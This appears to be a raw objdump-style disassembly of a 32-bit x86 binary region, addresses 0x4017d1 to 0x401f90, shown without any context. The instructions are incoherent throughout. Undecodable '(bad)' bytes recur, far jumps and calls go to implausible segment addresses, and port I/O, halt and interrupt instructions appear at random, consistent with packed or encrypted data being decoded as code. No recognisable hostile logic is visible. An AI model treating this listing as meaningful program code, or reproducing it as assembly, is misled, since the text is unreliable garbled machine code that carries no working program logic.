  4017d1:	sbb    DWORD PTR [esp+esi*8],eax
  4017d4:	add    al,0xda
  4017d6:	and    ebx,0x6d572b64
  4017dc:	push   cs
  4017dd:	jae    0x4017dc
  4017df:	enter  0x1133,0xf7
  4017e3:	ret    0x78fe
  4017e6:	pop    ds
  4017e7:	add    eax,0x5a1601f6
  4017ec:	jp     0x401839
  4017ee:	(bad)  
  4017ef:	sub    DWORD PTR [ebp-0x42],eax
  4017f2:	jb     0x401857
  4017f4:	(bad)  
  4017f5:	sbb    al,0xb6
  4017f7:	shl    BYTE PTR [ecx+ebx*1+0x64308e9],0x8f
  4017ff:	dec    edx
  401800:	pop    ds
  401801:	jmp    0x401803
  401803:	or     al,0xc8
  401805:	add    ebx,esi
  401807:	loop   0x4017d8
  401809:	fucomip st,st(7)
  40180b:	add    bh,BYTE PTR [edi+0x77]
  40180e:	fdiv   DWORD PTR [ebx]
  401810:	mul    BYTE PTR [ebx+0xb6d00a9]
  401816:	and    eax,0xa1980360
  40181b:	fsub   st(0),st
  40181d:	lock add ebx,eax
  401820:	test   DWORD PTR [eax+0x16311402],ebp
  401826:	clc    
  401827:	sbb    ebp,DWORD PTR [ebx-0x67]
  40182a:	or     BYTE PTR [edx],bl
  40182c:	and    DWORD PTR [ebx],0xfffffffe
  40182f:	cli    
  401830:	pop    edx
  401831:	rol    BYTE PTR [edi-0xbac73f2],0x2c
  401838:	xor    ebx,ebx
  40183a:	mov    bh,0x94
  40183c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40183d:	mov    ss,WORD PTR [edi]
  40183f:	or     eax,0x8f27f15c
  401844:	jb     0x4017f1
  401846:	sbb    DWORD PTR [esi+0x27840af],esi
  40184c:	mov    esi,0x6f6ed73f
  401852:	or     eax,0xc8dd0bf
  401857:	cs sub edx,ecx
  40185a:	sbb    DWORD PTR [edi-0x12],edi
  40185d:	lock sub esi,ebp
  401860:	xor    eax,0x6056c72b
  401865:	in     al,dx
  401866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401867:	fmul   QWORD PTR [edi*2-0x372ad7ea]
  40186e:	and    al,0x9b
  401870:	mov    DWORD PTR [ebp-0x3d],ebx
  401873:	(bad)  
  401874:	fadd   st,st(7)
  401876:	dec    ebx
  401877:	or     bl,BYTE PTR [ebp+eiz*4+0xa]
  40187b:	(bad)  
  40187c:	xor    al,0xf4
  40187e:	fmul   DWORD PTR ds:0x4458d18
  401884:	adc    BYTE PTR [ebx+0x3acb243c],cl
  40188a:	sahf   
  40188b:	jp     0x4018f4
  40188d:	or     eax,0xa06ed5f0
  401892:	push   esi
  401893:	cmp    eax,0x75ff6d4c
  401898:	jmp    0x40769fa
  40189d:	cmc    
  40189e:	shl    BYTE PTR [esi+0xa],1
  4018a1:	lea    edx,[eiz*2-0x214e2530]
  4018a8:	(bad)  
  4018a9:	and    DWORD PTR [esi],ecx
  4018ab:	adc    esp,0x1b3ac5a
  4018b1:	neg    DWORD PTR ds:0x850cde24
  4018b7:	sti    
  4018b8:	sub    DWORD PTR [ecx+0x59adda34],ecx
  4018be:	jmp    0xe81e:0x308f4e5
  4018c5:	or     al,0xa
  4018c7:	sub    cl,dl
  4018c9:	inc    esi
  4018ca:	ss sar bl,cl
  4018cd:	jbe    0x4018fd
  4018cf:	jns    0x401927
  4018d1:	fwait
  4018d2:	jne    0x4018bd
  4018d4:	mov    eax,0x7002f8c0
  4018d9:	outs   dx,DWORD PTR ds:[esi]
  4018da:	outs   dx,BYTE PTR ds:[esi]
  4018db:	call   0x23e5:0x5d81c19d
  4018e2:	adc    al,0x6c
  4018e4:	xchg   BYTE PTR [ebx-0x63],dh
  4018e7:	sti    
  4018e8:	xchg   BYTE PTR [eax-0x5e],al
  4018eb:	or     BYTE PTR [eax+0x35],bl
  4018ee:	js     0x401900
  4018f0:	dec    ebx
  4018f1:	xor    ch,BYTE PTR [edi+0x2f5658c6]
  4018f7:	ficom  WORD PTR [ebp-0x2a]
  4018fa:	or     ch,bl
  4018fc:	and    BYTE PTR [edi],bl
  4018fe:	dec    ebx
  4018ff:	cli    
  401900:	or     BYTE PTR [esi+0x7d],dl
  401903:	cmp    al,0x1d
  401905:	sbb    eax,0xd7c2e24
  40190a:	fs push cs
  40190c:	loopne 0x401946
  40190e:	inc    ecx
  40190f:	push   ss
  401910:	sub    ecx,DWORD PTR [eax+0x4f]
  401913:	dec    esi
  401914:	adc    BYTE PTR [edx],dl
  401916:	int3   
  401917:	push   edi
  401918:	add    DWORD PTR [edi],0x37f8146e
  40191e:	inc    ebp
  40191f:	xor    edx,DWORD PTR [esi]
  401921:	popw   ds
  401923:	adc    al,0x0
  401925:	jle    0x401967
  401927:	or     BYTE PTR [ecx+0xc],bh
  40192a:	pop    ds
  40192b:	xor    eax,0x79b7f66
  401930:	jmp    0x40195d
  401932:	gs adc al,0x83
  401935:	enter  0xec,0x3b
  401939:	imul   ebx,DWORD PTR [eax],0x23
  40193c:	les    ebx,FWORD PTR [eax]
  40193e:	mov    esp,0x50618c0
  401943:	push   edi
  401944:	xchg   ebx,eax
  401945:	cmp    BYTE PTR [edi+eax*8],dl
  401948:	push   edx
  401949:	inc    edx
  40194a:	les    ebp,FWORD PTR [esi-0x69727a3b]
  401950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401952:	jno    0x401978
  401954:	adc    BYTE PTR [edx+ebp*2+0x3a9acc19],dl
  40195b:	mov    eax,ds:0x2eeff85c
  401960:	inc    esi
  401961:	loopne 0x4019b5
  401963:	jp     0x40193d
  401965:	jae    0x401971
  401967:	shr    BYTE PTR [eax],cl
  401969:	sub    DWORD PTR [edi],eax
  40196b:	add    DWORD PTR [edi-0x5b],eax
  40196e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40196f:	mov    edx,0x4030005
  401974:	repz sbb DWORD PTR [edx+esi*4],esp
  401978:	cs cld 
  40197a:	mov    al,0xef
  40197c:	(bad)  
  40197d:	jae    0x401987
  40197f:	sbb    BYTE PTR [eax+0x75f03b16],ah
  401985:	adc    DWORD PTR [esp+eax*1+0x23bac6ba],ecx
  40198c:	cmp    al,0xfb
  40198e:	jmp    0x78c8916
  401993:	or     DWORD PTR [ebx-0x29d52a8e],0x1a30821e
  40199d:	mov    ebx,0xdfb0d72b
  4019a2:	mov    ds:0x438dd48d,eax
  4019a7:	lods   al,BYTE PTR ds:[esi]
  4019a8:	xchg   edi,esi
  4019aa:	push   esi
  4019ab:	sti    
  4019ac:	or     BYTE PTR [eax-0x7d],dh
  4019af:	xchg   ebx,eax
  4019b0:	fimul  DWORD PTR [ebx]
  4019b2:	mov    eax,esp
  4019b4:	xchg   esp,eax
  4019b5:	inc    eax
  4019b6:	add    DWORD PTR [esi],eax
  4019b8:	add    edi,DWORD PTR [eax+eax*4+0x2]
  4019bc:	mov    DWORD PTR [ebx],0x86360ebb
  4019c2:	and    ebx,DWORD PTR [esi-0x73]
  4019c5:	cs ret 
  4019c7:	xor    BYTE PTR [ecx],cl
  4019c9:	sbb    BYTE PTR [edi+0x3b],dl
  4019cc:	dec    ebx
  4019cd:	and    DWORD PTR [edi+0x51],ebx
  4019d0:	pop    edx
  4019d1:	int3   
  4019d2:	imul   edx,DWORD PTR [edi+0x58],0x46
  4019d6:	or     cl,BYTE PTR [edi]
  4019d8:	ds call 0xb71b:0x6cf197f
  4019e0:	pop    es
  4019e1:	dec    esp
  4019e2:	xor    esp,0x123a831c
  4019e8:	or     BYTE PTR [edi+ebx*2-0x18f05bf4],cl
  4019ef:	mov    eax,DWORD PTR [edx]
  4019f1:	pop    edx
  4019f2:	and    esp,esi
  4019f4:	or     BYTE PTR [edx+edi*1],bh
  4019f7:	mov    esp,0xbdb8bf87
  4019fc:	mov    edx,0xa1171558
  401a01:	sub    eax,0xabc7ce5e
  401a06:	aad    0xe
  401a08:	mul    BYTE PTR [edi+0x6b]
  401a0b:	adc    BYTE PTR [eax+0x169a10d8],0x89
  401a12:	pop    edx
  401a13:	or     BYTE PTR [esi+esi*4],al
  401a16:	ins    BYTE PTR es:[edi],dx
  401a17:	or     ecx,DWORD PTR [ebp+0xb16d9dd]
  401a1d:	cmp    edi,DWORD PTR [edi-0x4f]
  401a20:	and    DWORD PTR [edi+0x73],esi
  401a23:	rcl    BYTE PTR [edi],0xbb
  401a26:	xor    eax,DWORD PTR [edi]
  401a28:	je     0x401a54
  401a2a:	int3   
  401a2b:	outs   dx,BYTE PTR ds:[esi]
  401a2c:	mov    DWORD PTR [esi],0xea876a3
  401a32:	ret    
  401a33:	adc    esp,ecx
  401a35:	inc    ecx
  401a36:	cmp    DWORD PTR [esi],0xffffff9c
  401a39:	mov    al,ds:0x607adb3b
  401a3e:	or     eax,0x750ac46c
  401a43:	xor    eax,0x8777b768
  401a48:	adc    eax,DWORD PTR [ecx+0x3b]
  401a4b:	pop    ebp
  401a4c:	daa    
  401a4d:	mov    DWORD PTR [ecx],ebp
  401a4f:	add    al,0x9
  401a51:	add    eax,0xcf2d2b5c
  401a56:	jge    0x401a84
  401a58:	or     BYTE PTR [edx],bl
  401a5a:	std    
  401a5b:	xchg   DWORD PTR [ecx],edx
  401a5d:	ds pop ds
  401a5f:	push   esi
  401a60:	sbb    BYTE PTR [ecx],al
  401a62:	sbb    eax,0xcbfcc359
  401a67:	sbb    DWORD PTR [esi],ebx
  401a69:	pop    ds
  401a6a:	dec    esp
  401a6b:	add    al,BYTE PTR [edx-0x7]
  401a6e:	ds jmp 0xeb83:0x3debb6ac
  401a76:	and    ebx,ebp
  401a78:	jmp    0x401ae3
  401a7a:	jnp    0x401a90
  401a7c:	ins    DWORD PTR es:[edi],dx
  401a7d:	push   0x6d
  401a7f:	fild   DWORD PTR [eax+edx*2-0x3f6e3d73]
  401a86:	jl     0x401a94
  401a88:	xor    ebx,DWORD PTR ds:0xd37d5d81
  401a8e:	xchg   edx,eax
  401a8f:	xor    al,0xeb
  401a91:	push   ds
  401a92:	push   edi
  401a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a94:	inc    ecx
  401a95:	leave  
  401a96:	mov    ch,0xb7
  401a98:	jne    0x401aa1
  401a9a:	iret   
  401a9b:	inc    ecx
  401a9c:	push   es
  401a9d:	pop    eax
  401a9e:	fdiv   DWORD PTR [ebx-0x52]
  401aa1:	and    BYTE PTR [edx+0x6a0cbaef],bh
  401aa7:	bound  ecx,QWORD PTR [eax-0x72]
  401aaa:	add    bh,cl
  401aac:	scas   eax,DWORD PTR es:[edi]
  401aad:	adc    BYTE PTR [edx+ecx*1],ah
  401ab0:	inc    edi
  401ab1:	sub    esp,0x53
  401ab4:	inc    edi
  401ab5:	xchg   BYTE PTR [edi-0x2d],dl
  401ab8:	mov    dl,0x6b
  401aba:	mov    ebx,esp
  401abc:	or     dh,al
  401abe:	je     0x401a6d
  401ac0:	clc    
  401ac1:	mov    bh,0x79
  401ac3:	push   ss
  401ac4:	fwait
  401ac5:	pop    edi
  401ac6:	jle    0x401ab3
  401ac8:	inc    ebp
  401ac9:	cld    
  401aca:	adc    al,0xef
  401acc:	test   BYTE PTR [esp+ebp*8],dl
  401acf:	lea    ecx,[esi]
  401ad1:	and    BYTE PTR [ecx],dh
  401ad3:	popf   
  401ad4:	add    ebx,0xffffffdb
  401ad7:	sbb    al,0x71
  401ad9:	loope  0x401add
  401adb:	dec    esi
  401adc:	cmp    ebx,0x9
  401adf:	add    eax,0x484385bb
  401ae4:	out    dx,al
  401ae5:	adc    eax,DWORD PTR [edi+0xf]
  401ae8:	(bad)  
  401ae9:	lods   al,BYTE PTR ds:[esi]
  401aea:	or     esi,esp
  401aec:	push   ebp
  401aed:	lods   eax,DWORD PTR ds:[esi]
  401aee:	popf   
  401aef:	scas   al,BYTE PTR es:[edi]
  401af0:	test   eax,edi
  401af2:	cmp    eax,edi
  401af4:	aad    0x89
  401af6:	or     al,0xec
  401af8:	sbb    esp,ebx
  401afa:	lods   eax,DWORD PTR ds:[esi]
  401afb:	ins    DWORD PTR es:[edi],dx
  401afc:	adc    esp,ebp
  401afe:	pop    es
  401aff:	xchg   esp,eax
  401b00:	and    bh,dh
  401b02:	or     eax,0xedc581a4
  401b07:	mov    dl,0xe
  401b09:	lock lock cmp ecx,DWORD PTR [ebx]
  401b0d:	jne    0x401b1d
  401b0f:	fwait
  401b10:	inc    ecx
  401b11:	loop   0x401b30
  401b13:	in     al,dx
  401b14:	jmp    0x401b3c
  401b16:	inc    ebx
  401b17:	dec    ebp
  401b18:	lock push cs
  401b1a:	loopne 0x401b75
  401b1c:	mov    dl,0x75
  401b1f:	pop    es
  401b20:	hlt    
  401b21:	sub    eax,0xedf4f0a3
  401b26:	xor    BYTE PTR [ebx-0x13e90713],cl
  401b2c:	or     ebx,DWORD PTR [eax]
  401b2e:	pop    ecx
  401b2f:	and    ecx,edi
  401b31:	ror    BYTE PTR [edi+edx*1],1
  401b34:	adc    BYTE PTR [esi],dl
  401b36:	inc    ebp
  401b37:	cld    
  401b38:	fcomp  DWORD PTR [edi]
  401b3a:	(bad)  
  401b3b:	jbe    0x401aff
  401b3d:	sub    BYTE PTR [eax+ebp*8],dl
  401b40:	cmp    esi,DWORD PTR [ebp+0x29537f14]
  401b46:	pop    es
  401b47:	inc    ecx
  401b48:	mov    bh,BYTE PTR ds:0x30dd2a4
  401b4e:	push   cs
  401b4f:	test   al,0x6c
  401b51:	and    BYTE PTR [ecx+ecx*1+0x5de14ae2],dh
  401b58:	mov    eax,ds:0xeba9c637
  401b5d:	xor    al,BYTE PTR [edx+edx*1+0x1f]
  401b61:	das    
  401b62:	stc    
  401b63:	add    ecx,ecx
  401b65:	add    DWORD PTR [ebx+esi*8],edx
  401b68:	mov    eax,DWORD PTR [ebp-0x4]
  401b6b:	pop    ebx
  401b6c:	mov    esp,ebp
  401b6e:	sub    bl,0x19
  401b71:	push   cs
  401b72:	lock stos DWORD PTR es:[edi],eax
  401b74:	sbb    DWORD PTR [ebx-0x4e],0x1c83ace6
  401b7b:	pop    ds
  401b7c:	jne    0x401b94
  401b7e:	jae    0x401b88
  401b80:	dec    edi
  401b81:	ss cmp al,0x43
  401b84:	mov    bl,0x6
  401b86:	mov    dh,0x16
  401b88:	(bad)  
  401b89:	push   ss
  401b8a:	ret    
  401b8b:	mov    eax,0x89214f0c
  401b90:	pop    ebp
  401b91:	clc    
  401b92:	and    DWORD PTR [esi],edx
  401b94:	addr16 sbb edi,esp
  401b97:	sub    al,0x2a
  401b99:	clc    
  401b9a:	sbb    dh,dh
  401b9c:	ret    
  401b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b9e:	cmovl  ecx,DWORD PTR [ecx]
  401ba1:	sbb    BYTE PTR [edi+esi*8-0x69baa0],dh
  401ba8:	or     eax,0xb6cdbece
  401bad:	inc    esp
  401bae:	sti    
  401baf:	mov    edx,0xb01e292b
  401bb4:	sub    DWORD PTR [edi],ebx
  401bb6:	push   ebx
  401bb7:	cmp    al,0x3d
  401bb9:	mov    eax,0x610c30e3
  401bbe:	mov    cl,0x7
  401bc0:	test   eax,0x8606f503
  401bc5:	and    DWORD PTR [ebx+0x39cd0a3e],eax
  401bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bcc:	lods   al,BYTE PTR ds:[esi]
  401bcd:	adc    al,0x84
  401bcf:	int3   
  401bd0:	ins    BYTE PTR es:[edi],dx
  401bd1:	push   ds
  401bd2:	and    cl,BYTE PTR [ebp-0x4ee3b3eb]
  401bd8:	jle    0x401bca
  401bda:	add    al,0xd0
  401bdc:	fs ret 
  401bde:	and    al,0x95
  401be0:	(bad)  
  401be1:	add    eax,ebx
  401be3:	sbb    ecx,esp
  401be5:	or     BYTE PTR [edi+0x2c751828],cl
  401beb:	xchg   edx,eax
  401bec:	sbb    BYTE PTR [ecx],al
  401bee:	cwde   
  401bef:	add    DWORD PTR [esi+0x4],0x7ed5103e
  401bf6:	add    eax,0x8f89aa25
  401bfb:	aaa    
  401bfc:	and    esi,eax
  401bfe:	clc    
  401bff:	or     eax,0x10e77200
  401c04:	js     0x401c7c
  401c06:	je     0x401c26
  401c08:	mov    bl,0xf8
  401c0a:	add    al,0x95
  401c0c:	or     ecx,edx
  401c0e:	ins    BYTE PTR es:[edi],dx
  401c0f:	out    dx,al
  401c10:	mov    ebx,0x8831e4e
  401c15:	add    ebx,ebp
  401c17:	cmp    al,0x7
  401c19:	jns    0x401c0b
  401c1b:	mov    edx,0x1bd82672
  401c20:	add    al,0x85
  401c22:	or     BYTE PTR [ecx+0x9],al
  401c25:	cmp    DWORD PTR [edi],esi
  401c27:	popa   
  401c28:	(bad)  
  401c29:	adc    BYTE PTR [eax],cl
  401c2b:	or     al,0x33
  401c2d:	sbb    dl,BYTE PTR [edi+eiz*8]
  401c30:	(bad)  
  401c31:	in     al,0x4e
  401c33:	mov    ch,BYTE PTR [ebp-0x615c2c54]
  401c39:	mov    eax,ds:0xe10bc800
  401c3e:	and    al,0xd6
  401c40:	push   ss
  401c41:	retf   0x4918
  401c44:	retf   
  401c45:	sbb    BYTE PTR [edi+0x3e],0x13
  401c49:	out    dx,eax
  401c4a:	arpl   WORD PTR [ecx-0x6f],si
  401c4d:	jo     0x401bda
  401c4f:	xor    BYTE PTR [ecx-0x51b43d1a],al
  401c55:	inc    eax
  401c56:	jmp    0x401c2b
  401c58:	(bad)  
  401c59:	in     eax,0x3b
  401c5b:	repz add eax,0x7e9f4944
  401c61:	mov    dh,0xda
  401c63:	sbb    bl,cl
  401c65:	or     dl,bh
  401c67:	nop
  401c68:	out    dx,al
  401c69:	sub    ebp,ebx
  401c6b:	idiv   DWORD PTR [ebx]
  401c6d:	adc    eax,0x8323180
  401c72:	sub    BYTE PTR ds:0x8c8ec12d,ch
  401c78:	mov    ch,0xf6
  401c7a:	jge    0x18494def
  401c80:	sub    DWORD PTR [ebx-0x3c3a3022],ecx
  401c86:	cli    
  401c87:	inc    ebx
  401c88:	scas   al,BYTE PTR es:[edi]
  401c89:	inc    ebp
  401c8a:	test   BYTE PTR [eax],0x9f
  401c8d:	or     BYTE PTR [eax+0x6c],bl
  401c90:	or     edx,DWORD PTR [esi-0x60]
  401c93:	call   0x542a2300
  401c98:	inc    esp
  401c99:	(bad)  
  401c9b:	cmp    ebp,0xffffffdc
  401c9e:	and    ecx,ebp
  401ca0:	(bad)  
  401ca1:	sbb    eax,DWORD PTR [esi]
  401ca3:	outs   dx,DWORD PTR ds:[esi]
  401ca4:	in     al,dx
  401ca5:	int    0x2
  401ca7:	sub    BYTE PTR [eax],ch
  401ca9:	add    eax,0x9c204cca
  401cae:	movhps xmm2,QWORD PTR [ebx-0x75]
  401cb2:	sti    
  401cb3:	sub    edi,esi
  401cb5:	mov    eax,0xec7b1be9
  401cba:	cmp    eax,DWORD PTR gs:[ebx+0x7294f7f]
  401cc1:	add    DWORD PTR ds:0x3a425918,eax
  401cc7:	arpl   WORD PTR [edi],cx
  401cc9:	sbb    BYTE PTR [ecx-0x4e9bfaed],ah
  401ccf:	pop    esi
  401cd0:	mov    eax,ds:0x16736e46
  401cd5:	mov    bl,0xec
  401cd7:	mov    ebx,DWORD PTR [edi]
  401cd9:	or     ecx,ebx
  401cdb:	and    eax,0x58d80b5a
  401ce0:	sbb    dh,bh
  401ce2:	popa   
  401ce3:	dec    ecx
  401ce4:	mov    BYTE PTR [eax],dl
  401ce6:	not    DWORD PTR [edi]
  401ce8:	les    edx,FWORD PTR [esi]
  401cea:	clc    
  401ceb:	and    cl,cl
  401ced:	dec    edi
  401cee:	enter  0xfc6a,0xfd
  401cf2:	xchg   DWORD PTR [ecx+0x3c7b77e],ebx
  401cf8:	lds    esp,FWORD PTR [ecx]
  401cfa:	sub    edi,ebp
  401cfc:	adc    edx,0x2b
  401cff:	add    al,0xa
  401d01:	inc    ebp
  401d02:	mov    esi,0x250ed4ef
  401d07:	gs loop 0x401d2f
  401d0a:	xor    bl,bh
  401d0c:	dec    edi
  401d0d:	add    ebx,ebp
  401d0f:	in     al,0x59
  401d11:	jmp    0x401d4e
  401d13:	mov    ebp,0x15cd09c9
  401d18:	iret   
  401d19:	sub    ah,BYTE PTR [eax+0x59]
  401d1c:	mov    bl,0x81
  401d1e:	not    DWORD PTR ds:0x11341bd7
  401d24:	cwde   
  401d25:	push   cs
  401d26:	mov    DWORD PTR [esi+edx*8-0x3f],eax
  401d2a:	cs pushf 
  401d2c:	pop    ss
  401d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d2e:	jmp    0x401d4d
  401d30:	ret    0x263
  401d33:	or     al,0x81
  401d35:	xchg   BYTE PTR [ebx],cl
  401d37:	or     DWORD PTR [ebx+0xe],eax
  401d3a:	jmp    0x14175b83
  401d3f:	enter  0x4e93,0x2
  401d43:	sbb    BYTE PTR [ecx],0x94
  401d46:	retf   
  401d47:	sbb    DWORD PTR [ecx+0x528558ee],edx
  401d4d:	fsub   DWORD PTR [ecx+0x16]
  401d50:	ror    BYTE PTR [ebp-0x5a1d38b2],1
  401d56:	add    eax,0x3debfcd8
  401d5b:	in     eax,dx
  401d5c:	adc    ecx,DWORD PTR [esp+ebx*2+0x16]
  401d60:	inc    ebx
  401d61:	jb     0x401ce9
  401d63:	xchg   esi,eax
  401d65:	ror    DWORD PTR [ebx],0x7d
  401d68:	loopne 0x401d6d
  401d6a:	in     eax,dx
  401d6b:	jge    0x401d6f
  401d6d:	sbb    al,0x7e
  401d6f:	je     0x401d83
  401d71:	ins    BYTE PTR es:[edi],dx
  401d72:	retf   
  401d73:	xchg   ecx,eax
  401d74:	test   ecx,esi
  401d76:	sbb    bl,bl
  401d78:	sub    BYTE PTR [ebx],bl
  401d7a:	mov    al,0x3f
  401d7c:	adc    al,0x8
  401d7e:	int    0xbd
  401d80:	push   0xffffff8b
  401d82:	in     al,0x19
  401d84:	cwde   
  401d85:	(bad)  
  401d86:	aad    0xaa
  401d88:	mov    ah,0xc5
  401d8a:	pop    ecx
  401d8b:	inc    ebx
  401d8c:	fcomp  DWORD PTR [ebx-0x3d00d482]
  401d92:	jno    0x401ded
  401d94:	int    0x15
  401d96:	inc    eax
  401d97:	cmp    bl,al
  401d99:	add    eax,0x1b00e75
  401d9e:	lods   al,BYTE PTR ds:[esi]
  401d9f:	bound  edi,QWORD PTR [eax-0x1467e5c9]
  401da5:	add    eax,0x1673d7cf
  401daa:	outs   dx,DWORD PTR ds:[esi]
  401dab:	ins    BYTE PTR es:[edi],dx
  401dac:	sbb    eax,DWORD PTR [ebp+0x3c2a15aa]
  401db2:	cmp    BYTE PTR ds:0xece8eab8,ch
  401db8:	mov    al,0x2
  401dba:	daa    
  401dbb:	add    bh,dh
  401dbd:	ret    
  401dbe:	push   ecx
  401dbf:	arpl   WORD PTR [edi-0x3616a42b],di
  401dc5:	je     0x401df9
  401dc7:	jmp    0x401e3d
  401dc9:	sbb    BYTE PTR [eax-0x77],dl
  401dcc:	enter  0x4027,0x3b
  401dd0:	fist   DWORD PTR [esi-0x25]
  401dd3:	pop    ecx
  401dd4:	or     DWORD PTR [edx],esi
  401dd6:	sbb    DWORD PTR [eax-0x3d],esi
  401dd9:	sub    ecx,ebp
  401ddb:	lahf   
  401ddc:	xchg   ecx,eax
  401ddd:	in     eax,dx
  401dde:	ss pop eax
  401de0:	sbb    BYTE PTR [edi+edx*1],bh
  401de3:	jne    0x401dd0
  401de5:	adc    eax,0xb66f9901
  401dea:	je     0x401e1d
  401dec:	adc    al,dl
  401dee:	test   BYTE PTR [ecx],dh
  401df0:	out    0x6,eax
  401df2:	loope  0x401d7b
  401df4:	xlat   BYTE PTR ds:[ebx]
  401df5:	outs   dx,DWORD PTR ds:[esi]
  401df6:	mov    DWORD PTR [eax],edx
  401df8:	mov    dl,0x2d
  401dfa:	sbb    bl,al
  401dfc:	jno    0x401de1
  401dfe:	jnp    0x401e07
  401e00:	repz adc eax,0x4008db0f
  401e06:	xor    cl,BYTE PTR [ebx*8-0x7b97a456]
  401e0d:	pop    edi
  401e0e:	or     eax,0x98b54925
  401e13:	add    al,0xaf
  401e15:	jnp    0x401dda
  401e17:	aas    
  401e18:	cld    
  401e19:	jo     0x8bb7371a
  401e1f:	mov    al,bl
  401e21:	mov    bl,BYTE PTR [eax-0x5cf6bbbf]
  401e27:	pop    ds
  401e28:	loop   0x401e95
  401e2a:	sub    eax,0x837f40aa
  401e2f:	loopne 0x401eb0
  401e31:	adc    ecx,DWORD PTR [edi+0x7a9ff63a]
  401e37:	dec    esp
  401e38:	ret    
  401e39:	push   eax
  401e3a:	push   edx
  401e3b:	push   ecx
  401e3c:	cmp    al,BYTE PTR [ebx-0x274e7e48]
  401e42:	in     eax,dx
  401e43:	push   ss
  401e44:	out    dx,al
  401e45:	pop    eax
  401e46:	jne    0x401ec3
  401e48:	xor    eax,eax
  401e4a:	xchg   edi,eax
  401e4b:	rep lods eax,DWORD PTR ds:[esi]
  401e4d:	push   ss
  401e4e:	sbb    DWORD PTR [ebx+0x74],ebp
  401e51:	pop    edx
  401e52:	mov    DWORD PTR ds:0x15adf602,edi
  401e58:	lods   eax,DWORD PTR ds:[esi]
  401e59:	mov    DWORD PTR [esi+0x60a2205],ebp
  401e5f:	je     0x401e8c
  401e61:	mov    ecx,0xffdbf4bf
  401e66:	jle    0x401e80
  401e68:	cmp    edx,eax
  401e6a:	jg     0x401e87
  401e6c:	sub    eax,edx
  401e6e:	inc    eax
  401e6f:	cli    
  401e70:	jl     0x401e86
  401e72:	cmp    ecx,eax
  401e74:	jg     0x401e92
  401e76:	(bad)  
  401e77:	mov    BYTE PTR [edi],cl
  401e79:	inc    edi
  401e7a:	repz icebp 
  401e7c:	sbb    edi,esp
  401e7e:	sti    
  401e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e80:	jmp    0x401e93
  401e82:	mov    edx,0x31e58b01
  401e87:	leave  
  401e88:	jmp    0x401ef6
  401e8a:	shr    ebx,0xe8
  401e8d:	mov    BYTE PTR [edi],al
  401e8f:	cmp    BYTE PTR ss:[ecx+0x43c23fb6],ah
  401e96:	adc    eax,DWORD PTR [ecx-0x216802e2]
  401e9c:	in     eax,dx
  401e9d:	adc    eax,0x74bbd1db
  401ea2:	sub    eax,0x4841999f
  401ea7:	lods   eax,DWORD PTR ds:[esi]
  401ea8:	fmul   QWORD PTR [ebp-0x3997777b]
  401eae:	xchg   ecx,eax
  401eaf:	add    DWORD PTR [edx],edi
  401eb1:	add    al,0xfe
  401eb3:	cs xor al,0x77
  401eb6:	test   DWORD PTR [ebp+0x41092484],0x5056850
  401ec0:	or     al,0xbc
  401ec3:	push   esp
  401ec4:	jne    0x401ec7
  401ec6:	jae    0x401f44
  401ec8:	xor    al,0x8d
  401eca:	mov    bl,0x14
  401ecc:	aas    
  401ecd:	or     eax,0x86c46a0e
  401ed2:	sub    bl,BYTE PTR [edi]
  401ed4:	sub    BYTE PTR [edx+0x28],bl
  401ed7:	shl    BYTE PTR [esi-0x50],0xb9
  401edb:	and    BYTE PTR [edi],ch
  401edd:	mov    al,ds:0xc44b106a
  401ee2:	add    al,BYTE PTR [edx-0x74]
  401ee5:	ja     0x401f0b
  401ee7:	or     cl,bh
  401ee9:	sbb    eax,0x905142de
  401eee:	or     al,0xbc
  401ef0:	xchg   edi,eax
  401ef1:	fstp   TBYTE PTR [ebp-0x763d0003]
  401ef7:	xlat   BYTE PTR ds:[ebx]
  401ef8:	mov    eax,ds:0x1377f739
  401efd:	je     0x401f2e
  401eff:	sar    ecx,0x2
  401f02:	js     0x401f2e
  401f04:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f06:	mov    ebx,0xec03e183
  401f0b:	imul   DWORD PTR [edi-0x53]
  401f0e:	iret   
  401f0f:	mov    esp,0xfc317421
  401f14:	lea    edi,[ecx+edi*1-0x4]
  401f18:	sbb    BYTE PTR [ecx],dl
  401f1a:	std    
  401f1b:	sbb    DWORD PTR [ecx],edx
  401f1d:	pop    esp
  401f1e:	mov    bh,0x1d
  401f20:	add    esi,0x2
  401f23:	(bad)  
  401f24:	pop    ds
  401f25:	cld    
  401f26:	and    BYTE PTR [edx-0x69ee1f31],bl
  401f2c:	sub    BYTE PTR [esi],al
  401f2e:	xchg   esi,eax
  401f2f:	sub    BYTE PTR [eax+0x242d34d2],bh
  401f35:	clc    
  401f36:	sbb    edi,esp
  401f38:	jg     0x401fb5
  401f3a:	mov    cx,WORD PTR [eax+0x4]
  401f3e:	sub    cx,0xd7b1
  401f43:	push   edx
  401f44:	dec    ecx
  401f45:	sub    cx,0x2
  401f49:	jae    0x401f39
  401f4b:	mov    BYTE PTR [ebp-0x2578c9],0xd3
  401f52:	add    bl,ch
  401f54:	sbb    edi,DWORD PTR [ebx+ebp*8]
  401f57:	pop    ss
  401f58:	cmp    DWORD PTR [ecx+0x52f768e6],eax
  401f5e:	adc    al,0x74
  401f60:	pop    es
  401f61:	push   es
  401f62:	push   ebx
  401f63:	loopne 0x401fdf
  401f65:	adc    DWORD PTR [eax+0x60],ebx
  401f68:	iret   
  401f69:	sbb    eax,0x7646766
  401f6e:	mov    eax,ebx
  401f70:	les    esp,FWORD PTR [ebx-0x5e913da0]
  401f76:	jb     0x401f94
  401f78:	push   cs
  401f79:	sbb    al,0xc
  401f7b:	inc    edi
  401f7c:	mov    bh,0xdb
  401f7e:	mov    dl,0x19
  401f80:	mov    esi,0x573d4358
  401f85:	jb     0x401fb6
  401f87:	add    eax,0xbb16d7b3
  401f8c:	lods   eax,DWORD PTR ds:[esi]
  401f8d:	std    
  401f8e:	ja     0x401fb9
  401f90:	and    ax,0xd7b2
